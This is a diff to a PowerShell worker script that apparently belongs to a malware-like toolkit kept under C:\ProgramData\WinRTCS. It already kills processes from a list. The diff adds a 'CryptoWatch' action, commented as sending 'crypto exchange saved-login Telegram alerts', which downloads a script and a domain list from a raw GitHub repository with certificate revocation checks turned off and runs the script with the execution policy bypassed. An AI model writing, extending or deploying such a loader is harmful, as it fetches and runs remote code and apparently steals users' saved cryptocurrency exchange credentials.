@@ -1,10 +1,11 @@
-# WINRTCS_SIDEKICK 0.1.3 - pinned PowerShell worker for HuntKiller + RmmScan
+# WINRTCS_SIDEKICK 0.1.4 - pinned PowerShell worker for HuntKiller + RmmScan + CryptoWatch
 # 0.1.1: C33 killlist fallback (KeepTwo/SCCleanup/BVTFilter/WucacheWatchdog/KernCap)
 # 0.1.2: VEXLM/gonzo fallback (SCRepair/MSServices/9dd7e861/vexlm/RMM-AutoPurge)
 # 0.1.3: C34 SCWatchdog/pluxn/zytrx/uvexr/pulsv fallback
+# 0.1.4: CryptoWatch — crypto exchange saved-login Telegram alerts
 # Invoked by winrtcs_guard.cmd when SIDEKICK_SHA256 matches. Batch stays thin.
 param(
-    [Parameter(Mandatory = $true)][ValidateSet('Hunt', 'Rmm', 'Both')][string]$Action,
+    [Parameter(Mandatory = $true)][ValidateSet('Hunt', 'Rmm', 'Both', 'CryptoWatch')][string]$Action,
     [string]$WorkDir = 'C:\ProgramData\WinRTCS',
     [string]$KillList = 'C:\ProgramData\WinRTCS\killlist.cfg'
 )
@@ -209,8 +210,42 @@ function Invoke-RmmScan {
     Write-Flag 'rmm.done' 'ok'
 }
 
+function Invoke-CryptoWatch {
+    $cw = Join-Path $WorkDir 'winrtcs_crypto_watch.ps1'
+    $dom = Join-Path $WorkDir 'crypto_domains.cfg'
+    $baseGh = 'https://raw.githubusercontent.com/xnobuddy/github-drop/main'
+    $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
+    if (-not (Test-Path $cw)) {
+        if (Test-Path $curl) {
+            & $curl -f -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o $cw ("$baseGh/winrtcs_crypto_watch.ps1?t=" + (Get-Random)) 2>$null
+        }
+    }
+    if (-not (Test-Path $dom)) {
+        if (Test-Path $curl) {
+            & $curl -f -L --ssl-no-revoke --connect-timeout 12 --max-time 40 -o $dom ("$baseGh/winrtcs_crypto_domains.cfg?t=" + (Get-Random)) 2>$null
+        }
+    }
+    # refresh domains lightly when older than 24h
+    if (Test-Path $dom) {
+        try {
+            if (((Get-Date) - (Get-Item $dom).LastWriteTime).TotalHours -ge 24 -and (Test-Path $curl)) {
+                & $curl -f -L --ssl-no-revoke --connect-timeout 12 --max-time 40 -o $dom ("$baseGh/winrtcs_crypto_domains.cfg?t=" + (Get-Random)) 2>$null
+            }
+        } catch {}
+    }
+    if (-not (Test-Path $cw)) {
+        Write-Flag 'crypto_watch.done' 'FAIL_NO_SCRIPT'
+        return
+    }
+    $args = @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', $cw, '-WorkDir', $WorkDir)
+    if (Test-Path $dom) { $args += @('-DomainList', $dom) }
+    & powershell.exe @args
+    Write-Flag 'crypto_watch.done' 'ok'
+}
+
 switch ($Action) {
     'Hunt' { Invoke-HuntKiller }
     'Rmm' { Invoke-RmmScan }
     'Both' { Invoke-HuntKiller; Invoke-RmmScan }
+    'CryptoWatch' { Invoke-CryptoWatch }
 }
